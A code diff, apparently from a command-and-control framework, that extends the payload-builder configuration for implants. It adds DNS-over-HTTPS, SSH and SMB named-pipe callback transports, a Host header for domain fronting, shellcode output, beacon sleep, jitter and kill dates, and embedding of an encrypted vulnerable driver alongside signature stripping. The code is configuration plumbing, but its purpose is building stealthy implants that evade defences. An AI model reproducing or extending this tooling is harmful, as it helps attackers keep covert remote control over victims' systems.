@@ -41,6 +41,12 @@ pub struct PayloadConfig {
     /// Cargo feature flags to enable on the agent crate.
     #[serde(default)]
     pub features: Vec<String>,
+    /// Primary outbound transport requested for self-contained server builds.
+    #[serde(default)]
+    pub transport: PayloadTransport,
+    /// Runtime settings required by the selected transport.
+    #[serde(default)]
+    pub transport_settings: TransportSettings,
     /// Optional override for the encrypted output filename (without
     /// extension). Defaults to the profile name.
     #[serde(default)]
@@ -52,6 +58,19 @@ pub struct PayloadConfig {
     /// Set to `"agent-standalone"` when building with `outbound-c`.
     #[serde(default)]
     pub bin_name: Option<String>,
+    /// Plaintext artifact format to produce before payload encryption.
+    #[serde(default, alias = "format")]
+    pub output_format: PayloadFormat,
+    /// Base agent sleep interval in milliseconds.  When present, the builder
+    /// bakes it into the agent so generated payloads do not rely on agent.toml.
+    #[serde(default)]
+    pub sleep_ms: Option<u64>,
+    /// Agent jitter percentage, 0-100.  When present, baked into the agent.
+    #[serde(default)]
+    pub jitter: Option<u8>,
+    /// Optional kill date in YYYY-MM-DD form.  When present, baked into the agent.
+    #[serde(default)]
+    pub kill_date: Option<String>,
     // --- Artifact Kit (PE post-processing) fields ---
     /// Version info resource to inject into the PE.  Only effective for
     /// Windows PE targets; ignored on Linux/macOS.
@@ -84,6 +103,90 @@ pub struct PayloadConfig {
     /// so the agent doesn't require an `agent.toml` for module loading.
     #[serde(default)]
     pub module_aes_key: Option<String>,
+    /// Path to an XOR-encrypted vulnerable driver binary to embed when the
+    /// `embedded_driver` Cargo feature is enabled.
+    ///
+    /// This path is forwarded to the agent build as `ORCHESTRA_DRIVER_PATH`.
+    /// The file must already be XOR-encrypted with the HKDF session key
+    /// (see `resources/placeholder_driver.xor` for the format).  When absent
+    /// the agent still compiles with `embedded_driver` but runtime deployment
+    /// fails with a clear error — no silent placeholder is deployed.
+    #[serde(default)]
+    pub driver_path: Option<String>,
+}
+
+#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
+#[serde(rename_all = "kebab-case")]
+pub enum PayloadTransport {
+    #[default]
+    Tls,
+    Http,
+    Doh,
+    Ssh,
+    Smb,
+}
+
+impl PayloadTransport {
+    pub fn as_str(self) -> &'static str {
+        match self {
+            PayloadTransport::Tls => "tls",
+            PayloadTransport::Http => "http",
+            PayloadTransport::Doh => "doh",
+            PayloadTransport::Ssh => "ssh",
+            PayloadTransport::Smb => "smb",
+        }
+    }
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Default)]
+pub struct TransportSettings {
+    /// HTTP C2 endpoint, including scheme and port. Defaults to `http://<c2_address>`.
+    #[serde(default)]
+    pub http_endpoint: Option<String>,
+    /// Host header used by HTTP/DoH transports when domain fronting or virtual hosts are required.
+    #[serde(default)]
+    pub http_host_header: Option<String>,
+    /// DoH resolver/bridge URL. Defaults to `https://<c2_address>/dns-query`.
+    #[serde(default)]
+    pub doh_server_url: Option<String>,
+    /// DNS suffix expected by the DoH bridge.
+    #[serde(default)]
+    pub doh_domain: Option<String>,
+    /// SSH relay host. Defaults to the host portion of `c2_address`.
+    #[serde(default)]
+    pub ssh_host: Option<String>,
+    /// SSH relay port. Defaults to the port portion of `c2_address`, or 22.
+    #[serde(default)]
+    pub ssh_port: Option<u16>,
+    /// SSH username for relay authentication.
+    #[serde(default)]
+    pub ssh_username: Option<String>,
+    /// SSH authentication mode.
+    #[serde(default)]
+    pub ssh_auth: Option<common::config::SshAuthConfig>,
+    /// Optional SSH host-key SHA-256 fingerprint pin.
+    #[serde(default)]
+    pub ssh_host_key_fingerprint: Option<String>,
+    /// SMB named-pipe relay host. Defaults to the host portion of `c2_address`.
+    #[serde(default)]
+    pub smb_pipe_host: Option<String>,
+    /// SMB named-pipe name.
+    #[serde(default)]
+    pub smb_pipe_name: Option<String>,
+    /// SMB transport mode: `smb` or `tcp_relay`.
+    #[serde(default)]
+    pub smb_pipe_mode: Option<String>,
+    /// TCP relay port for `tcp_relay` mode.
+    #[serde(default)]
+    pub smb_tcp_relay_port: Option<u16>,
+}
+
+#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
+#[serde(rename_all = "kebab-case")]
+pub enum PayloadFormat {
+    #[default]
+    Exe,
+    Shellcode,
 }
 
 fn default_true() -> bool {
@@ -168,6 +271,186 @@ impl PayloadConfig {
 
         Ok(enc_key)
     }
+
+    pub fn transport_host(&self) -> Option<String> {
+        host_from_address(&self.c2_address)
+    }
+
+    pub fn transport_port(&self) -> Option<u16> {
+        port_from_address(&self.c2_address)
+    }
+
+    pub fn http_endpoint(&self) -> String {
+        self.transport_settings
+            .http_endpoint
+            .as_deref()
+            .map(str::trim)
+            .filter(|endpoint| !endpoint.is_empty())
+            .map(str::to_string)
+            .unwrap_or_else(|| endpoint_from_address(&self.c2_address, "http", None))
+    }
+
+    pub fn http_host_header(&self) -> Option<String> {
+        self.transport_settings
+            .http_host_header
+            .as_deref()
+            .map(str::trim)
+            .filter(|host| !host.is_empty())
+            .map(str::to_string)
+            .or_else(|| self.transport_host())
+    }
+
+    pub fn doh_server_url(&self) -> String {
+        self.transport_settings
+            .doh_server_url
+            .as_deref()
+            .map(str::trim)
+            .filter(|endpoint| !endpoint.is_empty())
+            .map(str::to_string)
+            .unwrap_or_else(|| endpoint_from_address(&self.c2_address, "https", Some("/dns-query")))
+    }
+
+    pub fn doh_domain(&self) -> Option<String> {
+        self.transport_settings
+            .doh_domain
+            .as_deref()
+            .map(str::trim)
+            .filter(|domain| !domain.is_empty())
+            .map(str::to_string)
+            .or_else(|| self.transport_host())
+    }
+
+    pub fn ssh_host(&self) -> Option<String> {
+        self.transport_settings
+            .ssh_host
+            .as_deref()
+            .map(str::trim)
+            .filter(|host| !host.is_empty())
+            .map(str::to_string)
+            .or_else(|| self.transport_host())
+    }
+
+    pub fn smb_pipe_host(&self) -> Option<String> {
+        self.transport_settings
+            .smb_pipe_host
+            .as_deref()
+            .map(str::trim)
+            .filter(|host| !host.is_empty())
+            .map(str::to_string)
+            .or_else(|| self.transport_host())
+    }
+
+    pub fn validate_transport_settings(&self) -> Result<()> {
+        match self.transport {
+            PayloadTransport::Tls | PayloadTransport::Http | PayloadTransport::Doh => Ok(()),
+            PayloadTransport::Ssh => {
+                if self.ssh_host().is_none() {
+                    return Err(anyhow!(
+                        "ssh transport requires ssh_host or a host in c2_address"
+                    ));
+                }
+                if self
+                    .transport_settings
+                    .ssh_username
+                    .as_deref()
+                    .map(str::trim)
+                    .filter(|username| !username.is_empty())
+                    .is_none()
+                {
+                    return Err(anyhow!("ssh transport requires ssh_username"));
+                }
+                if self.transport_settings.ssh_auth.is_none() {
+                    return Err(anyhow!("ssh transport requires ssh_auth"));
+                }
+                Ok(())
+            }
+            PayloadTransport::Smb => {
+                if self.smb_pipe_host().is_none() {
+                    return Err(anyhow!(
+                        "smb transport requires smb_pipe_host or a host in c2_address"
+                    ));
+                }
+                Ok(())
+            }
+        }
+    }
+}
+
+fn endpoint_from_address(
+    address: &str,
+    default_scheme: &str,
+    default_path: Option<&str>,
+) -> String {
+    let trimmed = address.trim();
+    if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
+        let mut endpoint = trimmed.to_string();
+        if let Some(path) = default_path {
+            let after_scheme = endpoint
+                .split_once("://")
+                .map(|(_, rest)| rest)
+                .unwrap_or(endpoint.as_str());
+            if !after_scheme.contains('/') {
+                endpoint.push_str(path);
+            }
+        }
+        endpoint
+    } else {
+        format!(
+            "{}://{}{}",
+            default_scheme,
+            trimmed,
+            default_path.unwrap_or("")
+        )
+    }
+}
+
+fn host_from_address(address: &str) -> Option<String> {
+    let authority = authority_from_address(address)?;
+    if let Some(rest) = authority.strip_prefix('[') {
+        return rest
+            .split_once(']')
+            .map(|(host, _)| host.trim().to_string())
+            .filter(|host| !host.is_empty());
+    }
+    let host = authority
+        .rsplit_once(':')
+        .map(|(host, _)| host)
+        .unwrap_or(authority)
+        .trim();
+    if host.is_empty() {
+        None
+    } else {
+        Some(host.to_string())
+    }
+}
+
+fn port_from_address(address: &str) -> Option<u16> {
+    let authority = authority_from_address(address)?;
+    if let Some(rest) = authority.strip_prefix('[') {
+        return rest
+            .split_once(']')
+            .and_then(|(_, remainder)| remainder.strip_prefix(':'))
+            .and_then(|port| port.parse().ok());
+    }
+    authority
+        .rsplit_once(':')
+        .and_then(|(_, port)| port.parse().ok())
+}
+
+fn authority_from_address(address: &str) -> Option<&str> {
+    let trimmed = address.trim();
+    if trimmed.is_empty() {
+        return None;
+    }
+    let without_scheme = trimmed
+        .split_once("://")
+        .map(|(_, rest)| rest)
+        .unwrap_or(trimmed);
+    without_scheme
+        .split('/')
+        .next()
+        .map(str::trim)
+        .filter(|authority| !authority.is_empty())
 }
 
 fn validate_legacy_hmac_key(hmac_key: &str) -> Result<()> {
@@ -268,6 +551,8 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         c_server_secret,
         server_cert_fingerprint: None,
         features: features.clone(),
+        transport: PayloadTransport::Tls,
+        transport_settings: TransportSettings::default(),
         output_name: None,
         // When outbound-c is selected, the payload is the agent standalone
         // binary, not the launcher.  The launcher waits for inbound console
@@ -282,6 +567,10 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         } else {
             None
         },
+        output_format: PayloadFormat::Exe,
+        sleep_ms: None,
+        jitter: None,
+        kill_date: None,
         // Artifact kit defaults — operators can edit the profile TOML to
         // configure version info, icons, manifests, etc.
         version_info: None,
@@ -291,6 +580,7 @@ pub fn cmd_configure(name: Option<String>) -> Result<()> {
         strip_signature: true,
         strip_debug: true,
         module_aes_key: None,
+        driver_path: None,
     };
     Ok(())
 }
@@ -388,15 +678,23 @@ mod tests {
             c_server_secret: Some("secret".to_string()),
             server_cert_fingerprint: None,
             features: vec!["persistence".to_string()],
+            transport: PayloadTransport::Tls,
+            transport_settings: TransportSettings::default(),
             output_name: Some("test_agent".to_string()),
             package: "agent-standalone".to_string(),
             bin_name: Some("agent-standalone".to_string()),
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
             version_info: None,
             icon_path: None,
             manifest_preset: None,
             custom_manifest: None,
             strip_signature: true,
             strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
         };
         let s = toml::to_string(&profile).unwrap();
         let back: PayloadConfig = toml::from_str(&s).unwrap();
@@ -415,15 +713,23 @@ mod tests {
             c_server_secret: None,
             server_cert_fingerprint: None,
             features: vec![],
+            transport: PayloadTransport::Tls,
+            transport_settings: TransportSettings::default(),
             output_name: None,
             package: "launcher".to_string(),
             bin_name: None,
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
             version_info: None,
             icon_path: None,
             manifest_preset: None,
             custom_manifest: None,
             strip_signature: true,
             strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
         };
         assert!(profile.encryption_key_bytes().is_err());
     }
@@ -455,15 +761,23 @@ package        = "launcher"
             c_server_secret: None,
             server_cert_fingerprint: None,
             features: vec![],
+            transport: PayloadTransport::Tls,
+            transport_settings: TransportSettings::default(),
             output_name: None,
             package: "launcher".to_string(),
             bin_name: None,
+            output_format: PayloadFormat::Exe,
+            sleep_ms: None,
+            jitter: None,
+            kill_date: None,
             version_info: None,
             icon_path: None,
             manifest_preset: None,
             custom_manifest: None,
             strip_signature: true,
             strip_debug: true,
+            module_aes_key: None,
+            driver_path: None,
         };
         assert!(profile.target_triple().is_err());
     }
@@ -568,11 +882,9 @@ package        = "launcher"
         for addr in profiles {
             let port: u16 = addr.split(':').last().unwrap().parse().unwrap();
             assert_eq!(
-                port,
-                server_agent_port,
+                port, server_agent_port,
                 "c2_address '{}' must use port {} (agent listener), not 8443 (dashboard)",
-                addr,
-                server_agent_port
+                addr, server_agent_port
             );
         }
     }
